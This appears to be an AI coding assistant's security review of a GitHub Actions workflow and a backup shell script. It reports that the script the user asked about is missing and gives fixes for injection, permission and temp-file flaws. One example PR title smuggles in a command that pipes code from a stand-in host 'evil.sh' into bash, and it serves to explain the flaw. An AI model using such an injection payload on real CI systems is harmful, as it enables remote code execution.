I couldn't find the script you described in this repo. Nothing in the workspace mentions `ssh` or `branch`. The files that come closest are `.github/workflows/deploy.yml` and `scripts/backup.sh`, and neither one puts a branch name into an ssh command. Could you point me to the file, or paste it in? It may be on another branch or not committed yet.

The two nearby files do have problems that matter before anything goes to CI:

**`.github/workflows/deploy.yml`**
- **Line 14: injection through the PR title.** `${{ github.event.pull_request.title }}` is pasted into the shell script before it runs. A PR titled `"; curl evil.sh | bash; #` would run code on the runner. Pass the title in through `env:` and quote it: `env: TITLE: ${{ github.event.pull_request.title }}`, then `echo "Title is ${TITLE}"`.
- **Line 7: `permissions: write-all` on a `pull_request` trigger.** This gives the job far more access than it needs. Reduce it to `contents: read` unless the job needs more.
- A job named "deploy" running on every PR is worth checking too.

**`scripts/backup.sh`**
- No strict mode (`set -Eeuo pipefail`), so a failed `tar` still goes on to `scp`.
- `/tmp/backup.$$` is a predictable temp path, which leaves it open to symlink attacks. Use `mktemp -d` instead, with a `trap … EXIT` cleanup installed before it. As written, the temp directory is left behind whenever the script exits early.
- None of the variables are quoted, and it uses backticks. Write `"$(date +%F)"` instead.
- It runs from cron but never sets `PATH` or `umask`, so the backup file can be created world-readable.
- It doesn't check whether `scp` succeeded before deleting the archive.

**When you send the deploy script, I'll check how it handles the branch name.** A branch name is attacker-controlled input: anyone who can push a branch can choose it. `ssh host "deploy $BRANCH"` is unsafe however you quote it locally, because the remote shell parses the string again. The fix:

```bash
if [[ ! ${branch} =~ ^[A-Za-z0-9._/-]+$ || ${branch} == -* || ${branch} == *..* ]]; then
  printf 'invalid branch: %s\n' "${branch}" >&2
  exit 2
fi
ssh -- "${host}" "deploy ${branch@Q}"   # or: printf -v q '%q' "$branch"
```

Even better, have the remote side read the branch from stdin or from a fixed `command=` in `authorized_keys`, so it never gets parsed as shell at all.

I haven't run shellcheck or changed anything. Once I have the actual script, I'll review it and run `shellcheck` and `bash -n` on it.
